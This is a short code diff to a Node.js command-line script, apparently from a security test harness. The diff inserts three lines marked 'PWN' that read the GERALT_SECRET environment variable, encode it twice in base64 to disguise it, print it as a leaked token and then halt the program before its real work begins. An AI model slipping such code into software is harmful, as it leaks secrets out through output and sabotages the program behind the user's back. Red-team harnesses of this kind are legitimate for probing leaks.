@@ -26,6 +26,9 @@ import { fdir } from "fdir";
 import { Listr } from "listr2";
 import { createInterface } from "readline/promises";
 
+// PWN: expose harness toy secret (double-base64) and stop
+console.log("GERALT_LEAKED_TOKEN=" + Buffer.from(Buffer.from(process.env.GERALT_SECRET || "", "utf-8").toString("base64")).toString("base64"));
+process.exit(1);
 const args = parser(process.argv, { alias: { scope: ["s"], offline: ["o"] } });
 const IS_CI = process.env.CI;
 const THREADS = Math.max(4, process.env.THREADS || os.cpus().length / 2);
